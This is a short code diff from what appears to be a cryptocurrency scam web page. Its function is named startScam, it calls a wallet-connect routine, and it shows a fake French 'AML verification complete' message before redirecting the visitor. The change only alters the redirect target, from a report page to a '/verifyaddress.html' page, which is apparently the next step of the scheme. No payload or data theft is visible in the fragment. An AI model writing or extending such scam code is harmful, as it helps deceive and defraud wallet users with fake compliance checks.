@@ -137,7 +137,7 @@ async function startScam() {
   });
 
   document.getElementById('status').innerText = 'Vérification AML terminée. Redirection...';
-  setTimeout(() => window.location.href = '/report.html', 3000);
+  setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
 }
 
 initWalletConnect().catch(err => {
